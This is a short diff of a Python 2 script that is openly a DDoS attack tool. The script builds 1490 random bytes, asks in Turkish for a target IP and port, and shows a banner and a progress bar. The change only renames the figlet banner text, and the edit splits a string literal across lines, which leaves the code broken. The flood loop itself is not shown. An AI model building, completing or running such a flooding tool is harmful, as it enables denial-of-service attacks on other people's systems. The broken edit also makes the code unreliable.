@@ -18,14 +18,15 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet Ght Ddos Attack")
+os.system("figlet G
+SHT Ddos Attack")
 print
 print
 ip = raw_input("Hedef ip : ")
 port = input("Hedef port : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet Attack Basliyor")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
